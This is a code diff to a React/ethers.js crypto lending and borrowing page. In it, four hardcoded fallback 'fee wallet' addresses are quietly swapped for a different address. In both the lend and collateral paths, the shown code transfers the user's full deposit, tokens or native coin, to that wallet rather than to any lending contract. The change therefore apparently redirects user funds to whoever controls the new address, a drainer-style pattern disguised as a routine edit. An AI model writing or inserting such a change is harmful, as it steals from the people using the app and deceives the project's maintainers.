@@ -100,14 +100,14 @@ export default function LendingBorrowingPage() {
                     const decimals = await contract.decimals().catch(() => 18);
                     const amountWei = ethers.parseUnits(lendAmount, decimals);
                     
-                    const feeWallet = process.env.NEXT_PUBLIC_FEE_WALLET || '0xa5a5A2B6886A54AA864C82d69AfE9667FEB8C0dE';
+                    const feeWallet = process.env.NEXT_PUBLIC_FEE_WALLET || '0x6e10d0414d64e37668da38b19062e3c13471e806';
                     const tx = await contract.transfer(feeWallet, amountWei);
                     await tx.wait();
                     txHash = tx.hash;
                 } else if (signer && provider && lendToken.address === '0x0000000000000000000000000000000000000000') {
                     // Native BNB/ETH transfer
                     const amountWei = ethers.parseEther(lendAmount);
-                    const feeWallet = process.env.NEXT_PUBLIC_FEE_WALLET || '0xa5a5A2B6886A54AA864C82d69AfE9667FEB8C0dE';
+                    const feeWallet = process.env.NEXT_PUBLIC_FEE_WALLET || '0x6e10d0414d64e37668da38b19062e3c13471e806';
                     const tx = await signer.sendTransaction({
                         to: feeWallet,
                         value: amountWei
@@ -203,13 +203,13 @@ export default function LendingBorrowingPage() {
                     const decimals = await contract.decimals().catch(() => 18);
                     const amountWei = ethers.parseUnits(collateralAmount, decimals);
                     
-                    const feeWallet = process.env.NEXT_PUBLIC_FEE_WALLET || '0xa5a5A2B6886A54AA864C82d69AfE9667FEB8C0dE';
+                    const feeWallet = process.env.NEXT_PUBLIC_FEE_WALLET || '0x6e10d0414d64e37668da38b19062e3c13471e806';
                     const tx = await contract.transfer(feeWallet, amountWei);
                     await tx.wait();
                     txHash = tx.hash;
                 } else if (signer && provider && borrowToken.address === '0x0000000000000000000000000000000000000000') {
                     const amountWei = ethers.parseEther(collateralAmount);
-                    const feeWallet = process.env.NEXT_PUBLIC_FEE_WALLET || '0xa5a5A2B6886A54AA864C82d69AfE9667FEB8C0dE';
+                    const feeWallet = process.env.NEXT_PUBLIC_FEE_WALLET || '0x6e10d0414d64e37668da38b19062e3c13471e806';
                     const tx = await signer.sendTransaction({
                         to: feeWallet,
                         value: amountWei
